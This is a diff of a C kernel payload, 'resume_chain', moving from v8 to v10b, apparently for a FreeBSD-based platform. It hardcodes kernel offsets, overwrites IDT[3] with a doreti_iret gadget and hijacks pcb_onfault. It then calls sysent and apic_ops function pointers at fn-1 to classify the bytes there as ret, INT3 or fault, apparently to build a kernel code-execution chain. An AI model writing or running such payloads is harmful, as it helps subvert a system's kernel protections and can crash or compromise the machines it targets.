@@ -1,45 +1,77 @@
 #include <stdint.h>
 
 /*
- * resume_chain v8 — CC byte scanner
+ * resume_chain v10b — sysent/apic_ops single-entry byte scanner
  *
- * Scans all 28 apic_ops function entries at fn-1 to find CC (INT3 padding)
- * bytes. Uses IDT[3]=doreti_iret for CC bounce detection + pcb_onfault
- * for fault recovery.
+ * Probes fn-1 of a single function for C3 (ret) / CC (INT3) / fault.
+ * Supports two sources: sysent table (~678 syscall entries) and
+ * apic_ops table (28 LAPIC entries, backward compat with v8/v10a).
  *
- * For each entry, calls fn_addr-1 with RAX sentinel 0xBAD0BAD0BAD0BAD0:
- *   - Returns sentinel unchanged → C3 (ret from previous function)
- *   - Returns different value    → CC (bounce fired, function executed)
- *   - Returns 0xFAFA...         → FAULT (pcb_onfault caught page fault)
- *   - Entry skipped             → 0x534B4950... (SKIP, dangerous function)
+ * Mode encoding via fw_ver (4 bytes from kldload):
+ *   byte[0] = entry index low byte
+ *   byte[1] = mode:
+ *     0xAA = sysent scan
+ *     0xEE = apic_ops scan (backward compat)
+ *   byte[2] = entry index high byte (for sysent entries > 255)
+ *   byte[3] = reserved
  *
- * Also tests 4 known ktext function addresses for additional CC data.
+ *   mode   = (fw_ver >> 8) & 0xFF
+ *   entry  = (fw_ver & 0xFF) | (((fw_ver >> 16) & 0xFF) << 8)
  *
- * Mode: fw_ver = 0x403 (scan)
+ * Examples:
+ *   printf '\x00\xAA\x00\x00'  → sysent[0]
+ *   printf '\x01\xAA\x00\x00'  → sysent[1]
+ *   printf '\xFF\xAA\x00\x00'  → sysent[255]
+ *   printf '\x00\xAA\x01\x00'  → sysent[256]
+ *   printf '\xA5\xAA\x02\x00'  → sysent[677]
+ *   printf '\x02\xEE\x00\x00'  → apic_ops[2]  (xapic_mode)
  *
- * Output layout:
- *   out[0]     = MAGIC (lo32) + status (hi32)
- *   out[1]     = kdata_base
- *   out[2]     = ktext_base
- *   out[3]     = cc_bitmap (bit i = apic_ops[i]-1 is CC)
- *   out[4]     = ret1_bitmap (bit i = CC AND returned 1, golden for bounce)
- *   out[5]     = cc_count (lo16) | tested_count (hi16) | first_cc_idx (byte6)
- *   out[6]     = first CC address (the CC byte, i.e. fn-1)
- *   out[7]     = skip_bitmap (which entries were not tested)
- *   out[8..35]  = per-entry raw return values (28 apic_ops)
- *   out[36..39] = extra ktext tests (copyin-1, copyout-1, cpu_switch-1, malloc-1)
- *   out[40..67] = apic_ops[i] addresses (28 entries, for reference)
- *   out[131]    = v8 end marker
+ * Probe technique:
+ *   1. Set IDT[3] = doreti_iret (CC bounce)
+ *   2. Set pcb_onfault for #PF recovery
+ *   3. Call fn-1 with RAX = 0xBAD0BAD0BAD0BAD0 (sentinel)
+ *   4. Classify result:
+ *      - sentinel unchanged → C3 (ret from previous function) → verdict=2
+ *      - FAFA marker        → #PF caught by pcb_onfault      → verdict=3
+ *      - other value        → CC bounce fired, fn executed    → verdict=1
+ *
+ * Output layout (uint64_t slots):
+ *   [0]      = MAGIC_RSCN(lo32) | status(hi32)
+ *              status: 0x010b = in-progress, 0x110b = complete
+ *   [1]      = kdata_base
+ *   [2]      = ktext_base
+ *   [3]      = curthread
+ *   [4..31]  = apic_ops[0..27] function pointers (always dumped)
+ *   [32]     = step/progress counter  (offset 0x100)
+ *   [33]     = entry index            (offset 0x108)
+ *   [34]     = fn ptr                 (offset 0x110)
+ *   [35]     = probe addr (fn-1)      (offset 0x118)
+ *   [36]     = raw probe result       (offset 0x120)
+ *   [37]     = verdict                (offset 0x128)
+ *   [38]     = source (0=apic, 1=sys) (offset 0x130)
+ *   [39]     = probe_offset (1)       (offset 0x138)
+ *   [63]     = end marker             (offset 0x1F8)
+ *              0xdeadbeefcafe010b
  */
 
 #define MAGIC_RSCN       0x5253434E
+
+/* Status codes */
+#define STATUS_INPROG    0x010b
+#define STATUS_DONE      0x110b
+#define END_MARKER       0xdeadbeefcafe010bULL
 
 /* kdata-relative offsets */
 #define OFF_IDT          0x64cdc80
 #define IDT_ENTRY_SIZE   16
 
-/* ktext-relative offset */
+/* ktext-relative offsets */
 #define OFF_APIC_OPS     0x1934AC8
+#define OFF_SYSENT       0x1100310
+
+/* Sysent structure: 48 bytes per entry, sy_call at offset +8 */
+#define SYSENT_SIZE      48
+#define SYSENT_SYCALL    8
 
 /* Gadget offsets (relative to kdata_base, negative = ktext) */
 #define OFF_DORETI_IRET  (-0x9cf84c)
@@ -54,57 +86,38 @@
 /* Sentinel values */
 #define SENTINEL_RAX     0xBAD0BAD0BAD0BAD0ULL
 #define FAULT_MARKER     0xFAFAFAFAFAFAFAFAULL
-#define SKIP_MARKER      0x534B4950534B4950ULL  /* "SKIPSKIP" */
 
 /* Number of apic_ops entries */
 #define APIC_OPS_COUNT   28
 
-/*
- * Skip mask: functions that are dangerous to call with zero args.
- * These write to LAPIC MMIO or send IPIs.
- *
- * apic_ops layout (FreeBSD lapic interface):
- *   [0]  create(apic_id, boot_cpu)  — allocates
- *   [1]  init(addr)                 — maps MMIO
- *   [2]  xapic_mode()               — returns 1 (safe)
- *   [3]  is_x2apic()                — returns 0/1 (safe)
- *   [4]  setup(boot_cpu)            — configures LAPIC
- *   [5]  dump(str)                  — printf with NULL (fault, caught)
- *   [6]  disable()                  — DISABLES LAPIC (dangerous!)
- *   [7]  eoi()                      — spurious EOI (usually safe)
- *   [8]  id()                       — reads APIC ID (safe)
- *   [9]  native_id()                — reads APIC ID (safe)
- *   [10] set_lvt_mask(...)          — writes LVT
- *   [11] set_lvt_mode(...)          — writes LVT
- *   [12] set_lvt_polarity(...)      — writes LVT
- *   [13] set_lvt_triggermode(...)   — writes LVT
- *   [14] set_tpr(...)               — writes TPR
- *   [15] get_timer_freq()           — reads freq (safe)
- *   [16] calibrate_timer()          — long/blocking
- *   [17] timer_enable_pmc()         — timer config
- *   [18] timer_disable_pmc()        — timer config
- *   [19] timer_enable_intr()        — enables interrupt
- *   [20] timer_disable_intr()       — disables interrupt
- *   [21] set_timer_mode(...)        — timer config
- *   [22] timer_set_divisor(...)     — timer config
- *   [23] timer_trigger()            — fires timer
- *   [24] timer_count()              — reads count (safe)
- *   [25] ipi_raw(reg, val)          — SENDS IPI (dangerous!)
- *   [26] ipi_vectored(vec, dest)    — SENDS IPI (dangerous!)
- *   [27] ipi_wait(delay)            — waits for IPI
- *
- * Conservative skip: disable LAPIC, send IPIs, calibrate (blocks)
- */
-#define SKIP_MASK  ((1u<<6)|(1u<<16)|(1u<<25)|(1u<<26))
+/* Modes */
+#define MODE_SYSENT      0xAA
+#define MODE_APICOPS     0xEE
 
-/* Extra ktext function offsets to test at -1 (relative to kdata_base) */
-static const int64_t extra_offsets[] = {
-    -0x9908e0,   /* copyin   (copyin-1 is CONFIRMED CC from v5) */
-    -0x990990,   /* copyout  */
-    -0x9d6f80,   /* cpu_switch */
-    -0xa9b00,    /* malloc   */
-};
-#define N_EXTRAS  4
+/* apic_ops skip mask (dangerous functions) */
+#define APIC_SKIP_MASK   ((1u<<6)|(1u<<16)|(1u<<25)|(1u<<26))
+
+/* Verdicts */
+#define VERDICT_SKIP     0
+#define VERDICT_CC       1   /* CC bounce: fn executed, returned a value */
+#define VERDICT_C3       2   /* C3 ret: sentinel unchanged */
+#define VERDICT_FAULT    3   /* #PF caught by pcb_onfault */
+
+/* Output slot indices */
+#define OUT_STATUS       0
+#define OUT_KDATA        1
+#define OUT_KTEXT        2
+#define OUT_CURTHREAD    3
+#define OUT_APIC_BASE    4   /* 4..31 = 28 apic_ops entries */
+#define OUT_STEP         32  /* 0x100 */
+#define OUT_ENTRY        33  /* 0x108 */
+#define OUT_FN           34  /* 0x110 */
+#define OUT_PROBE        35  /* 0x118 */
+#define OUT_RESULT       36  /* 0x120 */
+#define OUT_VERDICT      37  /* 0x128 */
+#define OUT_SOURCE       38  /* 0x130 */
+#define OUT_PROBEOFF     39  /* 0x138 */
+#define OUT_ENDMARK      63  /* 0x1F8 */
 
 typedef struct {
     uint64_t kdata_base;
@@ -175,22 +188,24 @@ static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t i
 }
 
 /*
- * Test a single ktext address at -1 for CC byte.
+ * Probe a single ktext address for byte classification.
  *
- * Sets pcb_onfault for #PF recovery. Uses RBX (callee-saved) to
- * preserve RSP across potential faults inside called functions.
+ * Saves RBP and RBX, uses RBX to hold RSP for fault recovery.
+ * This ensures both RSP and RBP are correctly restored even if
+ * the target function modifies them before faulting.
  *
  * Returns:
- *   SENTINEL_RAX  = C3 (ret, sentinel unchanged)
+ *   SENTINEL_RAX  = fn-1 is C3 (ret, sentinel unchanged in RAX)
  *   FAULT_MARKER  = page fault caught by pcb_onfault
- *   other         = CC bounce worked, value = function's return
+ *   other         = CC bounce worked, value = function's return in RAX
  */
-static uint64_t test_cc_byte(uint64_t target, uint64_t onfault_ptr)
+static uint64_t probe_byte(uint64_t target, uint64_t onfault_ptr)
 {
     uint64_t rv;
     __asm__ volatile(
-        /* Save callee-saved RBX, then stash RSP in it */
+        /* Save callee-saved RBX and RBP, stash RSP in RBX */
         "pushq %%rbx\n"
+        "pushq %%rbp\n"
         "movq %%rsp, %%rbx\n"
 
         /* Set pcb_onfault = recovery label */
@@ -211,14 +226,16 @@ static uint64_t test_cc_byte(uint64_t target, uint64_t onfault_ptr)
         /* Call target (fn-1) */
         "callq *%[fn]\n"
 
-        /* Normal return: save result, restore RBX */
+        /* Normal return: save result, restore regs */
         "movq %%rax, %[rv]\n"
+        "popq %%rbp\n"
         "popq %%rbx\n"
         "jmp 2f\n"
 
-        /* Fault recovery: restore RSP from RBX, then RBX from stack */
+        /* Fault recovery: restore RSP from RBX, then RBP and RBX */
         "1:\n"
         "movq %%rbx, %%rsp\n"
+        "popq %%rbp\n"
         "popq %%rbx\n"
         "movabsq $0xFAFAFAFAFAFAFAFA, %[rv]\n"
 
@@ -228,7 +245,7 @@ static uint64_t test_cc_byte(uint64_t target, uint64_t onfault_ptr)
 
         : [rv] "=&r"(rv)
         : [fn] "r"(target), [of] "r"(onfault_ptr)
-        : "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
+        : "rax", "rcx", "rdx", "rsi", "rdi",
           "r8", "r9", "r10", "r11", "memory"
     );
     return rv;
@@ -237,107 +254,121 @@ static uint64_t test_cc_byte(uint64_t target, uint64_t onfault_ptr)
 int module_start(kproc_args *args)
 {
     uint64_t kdata_base = args->kdata_base;
+    uint32_t fw_ver = args->fw_ver;
     volatile uint64_t *out = (volatile uint64_t *)args;
     volatile uint32_t *out32 = (volatile uint32_t *)args;
 
-    /* Clear output buffer */
-    for (int i = 0; i < 140; i++)
+    /* Clear output buffer (64 slots = 512 bytes) */
+    for (int i = 0; i < 64; i++)
         out[i] = 0;
 
+    /* Parse mode and entry index from fw_ver */
+    uint32_t mode = (fw_ver >> 8) & 0xFF;
+    uint32_t entry_idx = (fw_ver & 0xFF) | (((fw_ver >> 16) & 0xFF) << 8);
+
+    /* Derive kernel bases */
     uint64_t lstar = rdmsr(MSR_LSTAR);
     uint64_t ktext_base = lstar - LSTAR_OFFSET;
 
+    /* Write header */
     out32[0] = MAGIC_RSCN;
-    out[1] = kdata_base;
-    out[2] = ktext_base;
+    out32[1] = STATUS_INPROG;
+    out[OUT_KDATA] = kdata_base;
+    out[OUT_KTEXT] = ktext_base;
 
-    /* Compute addresses */
+    /* Get curthread */
+    uint64_t td;
+    __asm__ volatile("movq %%gs:0, %0" : "=r"(td));
+    out[OUT_CURTHREAD] = td;
+
+    /* Always dump all 28 apic_ops entries */
+    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
+    for (int i = 0; i < APIC_OPS_COUNT; i++)
+        out[OUT_APIC_BASE + i] = read8(apic_ops_addr + i * 8);
+
+    out[OUT_STEP] = 1;  /* Step 1: init done */
+
+    /* Compute IDT and doreti_iret addresses */
     uint64_t idt_base = kdata_base + OFF_IDT;
     uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;
-    uint64_t apic_ops_addr = ktext_base + OFF_APIC_OPS;
     uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;
 
-    /* Save original IDT[3] for restoration */
+    /* Save original IDT[3] */
     uint64_t orig_idt3_lo = read8(idt3_addr);
     uint64_t orig_idt3_hi = read8(idt3_addr + 8);
 
     /* Set IDT[3] = doreti_iret, IST=0 (for CC bounce) */
     idt_set_handler(idt3_addr, doreti_iret, 0);
 
-    /* Get curthread → PCB → onfault address */
-    uint64_t td;
-    __asm__ volatile("movq %%gs:0, %0" : "=r"(td));
+    /* Get pcb_onfault address */
     uint64_t pcb = read8(td + TD_PCB_OFF);
     uint64_t onfault_ptr = pcb + PCB_ONFAULT_OFF;
 
-    /* === SCAN ALL 28 APIC_OPS ENTRIES === */
+    out[OUT_STEP] = 2;  /* Step 2: IDT set up */
 
-    uint32_t cc_bitmap = 0;
-    uint32_t ret1_bitmap = 0;
-    uint32_t cc_count = 0;
-    uint32_t tested = 0;
-    uint32_t first_cc_idx = 0xFF;
-    uint64_t first_cc_addr = 0;
+    /* Determine function pointer to probe */
+    uint64_t fn_addr = 0;
+    uint32_t source = 0;
 
-    for (int i = 0; i < APIC_OPS_COUNT; i++) {
-        uint64_t fn_addr = read8(apic_ops_addr + i * 8);
-
-        /* Record address for reference */
-        out[40 + i] = fn_addr;
-
-        /* Skip dangerous functions */
-        if (SKIP_MASK & (1u << i)) {
-            out[8 + i] = SKIP_MARKER;
-            continue;
+    if (mode == MODE_SYSENT) {
+        /* Sysent scan: read sy_call from sysent[entry_idx] */
+        uint64_t sysent_base = ktext_base + OFF_SYSENT;
+        fn_addr = read8(sysent_base + (uint64_t)entry_idx * SYSENT_SIZE + SYSENT_SYCALL);
+        source = 1;
+    } else if (mode == MODE_APICOPS) {
+        /* apic_ops backward compat */
+        if (entry_idx < APIC_OPS_COUNT && !(APIC_SKIP_MASK & (1u << entry_idx))) {
+            fn_addr = read8(apic_ops_addr + entry_idx * 8);
         }
+        source = 0;
+    }
 
-        uint64_t target = fn_addr - 1;
-        uint64_t rv = test_cc_byte(target, onfault_ptr);
+    out[OUT_ENTRY] = entry_idx;
+    out[OUT_SOURCE] = source;
+    out[OUT_PROBEOFF] = 1;  /* probing fn-1 */
 
-        /* Write result immediately (survives partial crash) */
-        out[8 + i] = rv;
-        tested++;
+    out[OUT_STEP] = 3;  /* Step 3: fn resolved */
 
-        /* Classify */
-        if (rv != SENTINEL_RAX && rv != FAULT_MARKER) {
-            /* CC bounce worked — function executed and returned */
-            cc_bitmap |= (1u << i);
-            cc_count++;
+    if (fn_addr == 0) {
+        /* Skip: dangerous apic_ops entry or invalid mode */
+        out[OUT_FN] = 0;
+        out[OUT_PROBE] = 0;
+        out[OUT_RESULT] = 0;
+        out[OUT_VERDICT] = VERDICT_SKIP;
+    } else {
+        uint64_t probe_addr = fn_addr - 1;
 
-            if ((rv & 0xFFFFFFFF) == 1) {
-                /* Golden: function returns 1 = APIC_MODE_XAPIC */
-                ret1_bitmap |= (1u << i);
-            }
+        out[OUT_FN] = fn_addr;
+        out[OUT_PROBE] = probe_addr;
 
-            if (first_cc_idx == 0xFF) {
-                first_cc_idx = i;
-                first_cc_addr = target;
-            }
+        out[OUT_STEP] = 0x100;  /* Step 0x100: probing */
+
+        /* === PROBE === */
+        uint64_t rv = probe_byte(probe_addr, onfault_ptr);
+
+        out[OUT_RESULT] = rv;
+
+        out[OUT_STEP] = 0x101;  /* Step 0x101: verdict */
+
+        /* Classify result */
+        if (rv == FAULT_MARKER) {
+            out[OUT_VERDICT] = VERDICT_FAULT;
+        } else if (rv == SENTINEL_RAX) {
+            out[OUT_VERDICT] = VERDICT_C3;
+        } else {
+            out[OUT_VERDICT] = VERDICT_CC;
         }
     }
 
-    /* === EXTRA KTEXT FUNCTION TESTS === */
-    for (int i = 0; i < N_EXTRAS; i++) {
-        uint64_t fn_addr = kdata_base + extra_offsets[i];
-        uint64_t target = fn_addr - 1;
-        uint64_t rv = test_cc_byte(target, onfault_ptr);
-        out[36 + i] = rv;
-    }
+    out[OUT_STEP] = 4;  /* Step 4: probe complete */
 
-    /* === RESTORE IDT[3] === */
+    /* Restore IDT[3] */
     write8(idt3_addr, orig_idt3_lo);
     write8(idt3_addr + 8, orig_idt3_hi);
 
-    /* === WRITE SUMMARY === */
-    out[3] = cc_bitmap;
-    out[4] = ret1_bitmap;
-    out[5] = (uint64_t)cc_count |
-             ((uint64_t)tested << 16) |
-             ((uint64_t)first_cc_idx << 48);
-    out[6] = first_cc_addr;
-    out[7] = SKIP_MASK;
+    /* Write completion */
+    out32[1] = STATUS_DONE;
+    out[OUT_ENDMARK] = END_MARKER;
 
-    out32[1] = 0x0008;  /* v8 status */
-    out[131] = 0xdeadbeefcafe0080ULL;  /* v8 end marker */
     return 0;
 }
